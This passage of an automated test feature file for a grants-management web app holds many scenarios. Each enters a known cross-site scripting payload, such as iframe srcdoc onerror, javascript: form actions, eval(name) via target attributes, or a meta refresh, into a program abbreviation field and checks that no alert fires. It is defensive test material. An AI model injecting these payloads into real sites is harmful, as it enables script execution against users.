      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
     # | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM   | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301068 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <a href="%0aalert(1)" onclick="protocol='javascript'">test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301069 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                         | Field                |
      | <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301070 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                      | Field                |
      | <form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301071 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | <input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301072 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                         | Field                |
      | <link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301073 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                       | Field                |
      | <a href=# download="filename.html">Test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301075 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <img referrerpolicy="no-referrer" src="//portswigger-labs.net"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301079 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                | Field                |
      | <a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301089 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                        | Field                |
      | <iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301095 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                           | Field                |
      | <base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301096 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                  | Field                |
      | <a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301101 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                | Field                |
      | <img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301103 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                     | Field                |
      | <form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301105 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                            | Field                |
      | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301111 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                            | Field                |
      | <form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301117 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | <meta http-equiv="refresh" content="0; url=//portswigger-labs.net"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301126 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
